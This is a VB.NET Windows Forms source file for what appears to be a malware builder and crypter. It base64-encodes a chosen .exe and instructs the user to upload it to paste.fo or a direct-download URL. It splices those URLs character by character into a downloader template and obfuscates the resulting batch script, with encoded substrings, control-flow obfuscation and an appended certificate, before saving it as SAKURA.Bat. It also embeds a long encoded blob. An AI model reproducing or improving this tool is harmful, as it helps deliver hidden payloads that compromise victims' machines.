Imports System.IO
Imports System.Text
Imports System.Text.RegularExpressions

Public Class Form1
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub
    Private Sub HexButton1_Click(sender As Object, e As EventArgs) Handles HexButton1.Click
        RichTextBox1.Text = "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"
        MsgBox("Plese Upload This Strings to paste.fo , or Direct Downloading URL")
    End Sub
    Private Sub HexButton3_Click(sender As Object, e As EventArgs) Handles HexButton3.Click
        RichTextBox1.SelectAll()
        RichTextBox1.Copy()
        MsgBox("Copied Successfully ")
    End Sub
    Public Function Encrypt2(ByVal input As String, ByVal Key1 As String, ByVal Key2 As Integer)
        Try
            Dim x As Int64
            Dim y As Integer = -555

            For i = 1 To input.Length Step 1

                x = AscW(Mid(input, i)) + CUInt(Key1 + Key2 Mod y)

                Encrypt2 = Encrypt2 & ChrW(x)

            Next
        Catch ex As Exception
        End Try
    End Function
    Private Sub HexButton2_Click(sender As Object, e As EventArgs) Handles HexButton2.Click
        'Dim e1 As New OpenFileDialog

        'e1.Filter = "(*.EXE)|*.EXE"

        'If e1.ShowDialog = Windows.Forms.DialogResult.OK Then

        '    HexTextBox1.Text = e1.FileName

        'End If
        'RichTextBox2.Text = (Convert.ToBase64String(IO.File.ReadAllBytes(HexTextBox1.Text)))
        Dim openFileDialog As New OpenFileDialog()
        ' تحديد الخيارات الإضافية إذا لزم الأمر
        openFileDialog.Title = "اختر ملفًا"
        openFileDialog.Filter = "ملفات التنفيذ (*.exe)|*.exe"
        'openFileDialog.Filter = "ملفات التنفيذ |.exe"
        openFileDialog.InitialDirectory = ""

        ' عرض نافذة اختيار الملف
        If openFileDialog.ShowDialog() = DialogResult.OK Then
            ' الحصول على مسار الملف المحدد
            Dim selectedFilePath As String = openFileDialog.FileName
            'pa = RichTextBox3.Text
            ' استخدام مسار الملف كما تحتاج
            'Guna2HtmlLabel1.Text = selectedFilePath

            Dim text As String = Convert.ToBase64String(File.ReadAllBytes(selectedFilePath))
            Me.RichTextBox2.Text = text
            MsgBox("Plese Upload This Strings to paste.fo , or Direct Downloading URL")
        Else
            ' Guna2HtmlLabel1.Text = "choose Server"
        End If
    End Sub
    Private Sub HexButton4_Click(sender As Object, e As EventArgs) Handles HexButton4.Click
        RichTextBox2.SelectAll()
        RichTextBox2.Copy()
        MsgBox("Copied Successfully ")
    End Sub
#Region "SP Sub"
    Public Sub sp(ByVal maze As String, ByVal hi As String)
#Region "تقسيم الرابط"
        Dim inputText As String = maze

        ' وضع كل حرف داخل ""
        Dim charactersArray() As String = inputText.Select(Function(c) c.ToString()).ToArray()

        Dim f As String = (String.Join(" + ", charactersArray.Select(Function(c) """" & c & """")))
        RichTextBox3.Text = My.Resources.code.Replace("%%%FirstURL%%%", f)

        Dim input2 As String = hi
        Dim charactersArray2() As String = input2.Select(Function(c1) c1.ToString()).ToArray()
        Dim y As String = (String.Join(" + ", charactersArray2.Select(Function(c1) """" & c1 & """")))
        RichTextBox3.Text = (RichTextBox3.Text).Replace("%%%Sec URL%%%", y)
#End Region
#Region "Randowm String"
        Try
            If HexTextBoxRandowm1.Text.Length = 0 OrElse
               HexTextBoxRandowm2.Text.Length = 0 OrElse
               HexTextBoxRandowm3.Text.Length = 0 OrElse
               HexTextBoxRandowm4.Text.Length = 0 Then
                MessageBox.Show("Please fill in all TextBox controls before generating the file.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
                Return
            End If

            Dim stellervbs1 As String = RichTextBox3.Text
            stellervbs1 = stellervbs1.Replace("%%%Randowm1%%%", HexTextBoxRandowm1.Text)
            stellervbs1 = stellervbs1.Replace("%%%Randowm2%%%", HexTextBoxRandowm2.Text)
            stellervbs1 = stellervbs1.Replace("%%%Randowm3%%%", HexTextBoxRandowm3.Text)
            stellervbs1 = stellervbs1.Replace("%%%Randowm4%%%", HexTextBoxRandowm4.Text)
            RichTextBox3.Text = stellervbs1


            MessageBox.Show("File successfully created.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)
        Catch ex As Exception
            MessageBox.Show("An error occurred: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
#End Region
    End Sub
#End Region
    Private Sub HexButton5_Click(sender As Object, e As EventArgs) Handles HexButton5.Click
        If HexTextBox1.Text = "" Or HexTextBox2.Text = "" Then
            MsgBox("Please Add links First")
        Else
            RichTextBox3.SelectAll()
            RichTextBox3.Clear()
            sp(HexTextBox1.Text, HexTextBox2.Text)
        End If
    End Sub
    Public Sub Randwommmmmm()
        Dim characters As String = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
        ' Random number generator
        Dim rand As New Random()
        ' Length of the random string
        Dim totalLength As Integer = 55
        ' StringBuilder to build the random string
        Dim resultStringBuilder As New StringBuilder()
        ' Generate the random string
        For i As Integer = 1 To totalLength
            Dim randomIndex As Integer = rand.Next(0, characters.Length)
            resultStringBuilder.Append(characters(randomIndex))
        Next
        ' Get the random string
        Dim randomString As String = resultStringBuilder.ToString()
        ' Assuming HexTextBoxRandowm1 to HexTextBoxRandowm4 are your HexTextBox controls
        ' Split the random string into four parts
        Dim partLength As Integer = totalLength \ 4
        Dim part1 As String = randomString.Substring(0, partLength)
        Dim part2 As String = randomString.Substring(partLength, partLength)
        Dim part3 As String = randomString.Substring(partLength * 2, partLength)
        Dim part4 As String = randomString.Substring(partLength * 3, partLength)
        ' Assign each part to the corresponding HexTextBox
        HexTextBoxRandowm1.Text = part1
        HexTextBoxRandowm2.Text = part2
        HexTextBoxRandowm3.Text = part3
        HexTextBoxRandowm4.Text = part4
    End Sub
    Private Sub HexButton6_Click(sender As Object, e As EventArgs) Handles HexButton6.Click
        RichTextBox3.SelectAll()
        RichTextBox3.Copy()
        System.Threading.Thread.Sleep(200)
        RichTextBox3.SelectAll()
        RichTextBox3.Clear()
        MsgBox("Copied Successfully ")
    End Sub
    Private Sub HexTextBoxRandowm1_MouseMove(sender As Object, e As MouseEventArgs) Handles HexTextBoxRandowm1.MouseMove
        Randwommmmmm()
    End Sub
    Private Sub HexTextBoxRandowm2_MouseMove(sender As Object, e As MouseEventArgs) Handles HexTextBoxRandowm2.MouseMove
        Randwommmmmm()
    End Sub

    Private Sub HexTextBoxRandowm3_MouseMove(sender As Object, e As MouseEventArgs) Handles HexTextBoxRandowm3.MouseMove
        Randwommmmmm()
    End Sub
    Private Sub HexTextBoxRandowm4_MouseMove(sender As Object, e As MouseEventArgs) Handles HexTextBoxRandowm4.MouseMove
        Randwommmmmm()
    End Sub
    Private Sub HexButton7_Click(sender As Object, e As EventArgs) Handles HexButton7.Click
        If HexTextBox2.Text = "" Or HexTextBox1.Text = "" Or HexTextBox3.Text = "" Then
            MsgBox("Please Add links First,And Try Again!")
        Else
            Try
                ' Ensure HexTextBox controls have valid values

                Dim stellervbs1 As String = My.Resources.Last
                stellervbs1 = stellervbs1.Replace("%%%Last URL%%%", HexTextBox3.Text)
                ' Save the resulting string to a file
                ' RichTextBox3.Text = stellervbs1
                crypte(stellervbs1)
                MessageBox.Show("File successfully created.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)

            Catch ex As Exception
                MessageBox.Show("An error occurred: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
            End Try
        End If
        ' System.Threading.Thread.Sleep(1300)

    End Sub
    'سب البات 
    Public Sub crypte(ByVal Bat As String)

        Dim text = Bat

        Dim pattern = "(-----BEGIN CERTIFICATE-----.*?-----END CERTIFICATE-----)"

        Dim match = Regex.Match(text, pattern, RegexOptions.Singleline)
        Dim cert = match.Groups(1).Value

        text = Regex.Replace(text, pattern, "")

        text = TrimSpace(text)
        text = RemoveCommentary(text)

        Dim data = SubstringEncode(text)
        text = data.Item2  'Item2 is the obfuscated content
        text = data.Item1 & text   'Item1 is the key

        text = ControlFlow(text)

        ' text = Obfuscator.RandomVariableName(Obfuscator.RandomSubroutineName(text))

        text = text & Microsoft.VisualBasic.Constants.vbCrLf & cert

        File.WriteAllText(My.Application.Info.DirectoryPath & "\SAKURA.Bat", text)




    End Sub

#Region ""
    'اكتب تبع البات هون
#End Region
End Class
